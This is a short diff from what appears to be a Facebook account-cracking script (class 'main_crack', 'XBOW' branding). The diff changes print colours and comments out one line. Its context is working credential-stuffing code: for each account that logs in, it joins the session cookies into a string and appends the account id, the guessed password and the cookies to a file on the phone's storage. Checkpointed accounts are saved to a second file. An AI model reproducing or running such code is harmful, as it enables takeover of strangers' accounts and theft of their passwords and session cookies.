@@ -533,12 +533,12 @@ class main_crack():
                     ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"]);
                     cookie = f"{ckkk}"
                     print(f"\r\r{white}[{green}XBOW-OK{white}] {green}{sid} {green}-{green} {ps} ")
-                    print(f'\r\r{green}-[🤡]-{green} {cookie}''\n')
+                    print(f'\r\r{white}-[🤡]-{white} {cookie}''\n')
                     open('/sdcard/XBOW/XBOW-M2-COOKIE.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                     oks.append(sid)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    print(f"\r\r{black}[xbow-CP] • {sid} - {ps} ")
+                    ####print(f"\r\r{black}[xbow-CP] • {sid} - {ps} ")
                     open('/sdcard/XBOW/XBOW-CP.txt', 'a').write(sid + '|' + ps + '\n')
                     cps.append(sid)
                 else:
